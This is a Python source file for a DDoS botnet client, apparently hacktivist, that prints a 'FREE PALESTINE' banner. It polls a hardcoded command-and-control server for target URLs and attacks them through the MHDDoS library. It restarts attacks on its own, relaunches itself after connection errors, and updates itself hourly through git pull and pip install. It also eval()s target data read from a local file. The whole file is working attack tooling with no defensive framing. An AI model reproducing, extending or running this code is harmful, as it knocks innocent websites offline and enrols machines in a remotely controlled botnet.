import requests
import subprocess
import sys
import multiprocessing
import time
import schedule
from mhddos import runner
import os

palestine_text = """
\033[91m ____       _           _   _ \033[0m
\033[91m|  _ \\ __ _| | ___  ___| |_(_)_ __   ___\033[0m
\033[97m| |_) / _` | |/ _ \\/ __| __| | '_ \\ / _ \\\033[0m
\033[92m|  __/ (_| | |  __/\\__ \\ |_| | | | |  __/\033[0m
\033[32m|_|   \\__,_|_|\\___||___/\\__|_|_| |_|\\___|\033[0m

\033[91mF\033[91mR\033[91mE\033[97mE \033[92mP\033[92mA\033[92mL\033[92mE\033[91mS\033[91mT\033[92mA\033[92mI\033[91mN\033[91mE\033[0m
"""

class ProcessManager:
    def __init__(self):
        self.processes = []

    def add_process(self, process):
        self.processes.append(process)

    def stop_all_processes(self):
        for process in self.processes:
            process.terminate()
            process.join()

class AttackController:
    def __init__(self):
        self.target_url = get_target_1()
        self.attack_process = None
        self.stop_attack_flag = multiprocessing.Event()  # Use Event for signaling

    def load_url(self):
        self.target_url = get_target_1()
        self.stop_attack()
        self.start_attack()

    def set_stop_attack_flag(self, stop_attack_flag):
        self.stop_attack_flag = stop_attack_flag

    def start_attack(self):
        if self.attack_process is None or not self.attack_process.is_alive():
            self.attack_process = multiprocessing.Process(target=self._run_attack)
            try:
                self.attack_process.start()
            except Exception as e:
                self.stop_attack()
            print("Attack started!")

    def stop_attack(self):
        self.stop_attack_flag.set()
        if self.attack_process and self.attack_process.is_alive():
            self.attack_process.terminate()  # Terminate the attack process
            self.attack_process.join()
            print("Attack stopped!")

    def _run_attack(self):
        try:
            # Perform the specified attack
            print(self.target_url)
            runner.run(self.target_url)
            
            # Add additional conditions for other attack types if needed
            print("Attack completed!")
        except Exception as e:
            print(f"Error during attack: {e}")
            #self.stop_attack()
        finally:
            if not self.stop_attack_flag.is_set():
                self.start_attack()  # Restart the attack process if not signaled to stop

def self_update():
    try:
        # Run "git pull" to update the script
        subprocess.check_output(["git", "pull"])

        # Run "pip install -r requirements.txt" to update dependencies
        subprocess.check_output(["pip", "install", "-r", "requirements.txt"])

        # Restart the script within a tmux session
        subprocess.Popen(["tmux", "new-session", "-d", "python", sys.argv[0]])

        # Exit the current script
        sys.exit(0)
    except Exception as e:
        print(f"Error during self-update: {e}")

def stop():
    # Stop all threads before cleanup
    process_manager.stop_all_processes()
    # Add logic to stop the MHDDoS job or perform any necessary cleanup
    print("Stopping the current job")

def hi():
    try:
        # Run the hi function every 1 minute
        response = requests.get(f"{base_urls[0]}/hi/").json()
        if response["status"] == "ok":
            print("Hi request successful!")
    except requests.ConnectionError as e:
        print(f"Exception: {e}")
        print(f"Restarting the script...")
        python = sys.executable
        os.execl(python, python, *sys.argv)

schedule.every(1).minutes.do(hi)


def ping(base_url, attack_controller, stop_attack_flag): 
    current_target = get_target_1()
    try:
        # Run this function every 5 seconds to check for new jobs
        response = requests.get(f"{base_url}/ping/").json()

        if response["prioritize"]:
            new_target = get_target(base_url)["url"]
            if new_target != current_target:
                stop()
                save_target(new_target)
                # Start the work function in a separate process
                process = multiprocessing.Process(target=work, args=(attack_controller, get_target_1(), stop_attack_flag))
                process_manager.add_process(process)
                process.start()

        else:
            # Check if the first server is available
            if is_server_available(base_urls[0]):
                new_target = get_target(base_urls[0])["url"]
                if new_target != current_target:
                    stop()
                    print(new_target)
                    save_target(new_target)
                    
                    attack_controller.load_url()



            else:
                print(f"Server {base_urls[0]} not available. Switching to backup server.")
                new_target = get_target(base_urls[1])
                if new_target != current_target:
                    stop()
                    print(new_target)
                    save_target(new_target)
                    # Start the work function in a separate process
                    process = multiprocessing.Process(target=work, args=(attack_controller, get_target_1(), stop_attack_flag))
                    process_manager.add_process(process)
                    process.start()

    except requests.ConnectionError as e:
        print(f"Exception: {e}")
        print(f"Restarting the script...")
        python = sys.executable
        os.execl(python, python, *sys.argv)

        # Stop the process if an error occurs
        sys.exit(1)

def is_server_available(base_url):
    try:
        # Try sending a request to check server availability
        response = requests.get(f"{base_url}/ping/")
        return response.status_code == 200
    except requests.ConnectionError:
        return False

def get_target(base_url):
    # Fetch the job details from the server
    target = requests.get(f"{base_url}/get_job/").json()
    return target

def work(attack_controller, stop_attack_flag):
    attack_controller.set_stop_attack_flag(stop_attack_flag)
    attack_controller.load_url()
    attack_controller.start_attack()

def pending():
    while True:
        schedule.run_pending()
        time.sleep(1)

def get_target_1():
    import ast
    with open("current.txt", "r") as f:
        target = f.read()
    return eval(target)

def save_target(target):
    with open("current.txt", "w") as f:
        f.write(str(target))

schedule.every(1).hours.do(self_update)

if __name__ == "__main__":
    print(palestine_text)

    try:
        # Remove the process_manager initialization here
        process_manager = ProcessManager()
        base_urls = ["http://128.140.126.18:5000"]  # Replace with your actual base URLs
        for base_url in base_urls:
            target_url = get_target(base_url)["url"]
            save_target(str(target_url))
            attack_controller = AttackController()
            attack_controller.start_attack()

            # Schedule the ping function to run every 5 seconds
            schedule.every(5).seconds.do(ping, base_url=base_url, attack_controller=attack_controller, stop_attack_flag=attack_controller.stop_attack_flag)

        # Start the pending function in a separate process
        pending_process = multiprocessing.Process(target=pending, name="Pending stuff")
        process_manager.add_process(pending_process)
        pending_process.start()

        while True:
            # Run the pending function and sleep for a short duration
            schedule.run_pending()
            time.sleep(1)

    except KeyboardInterrupt:
        exit(2)
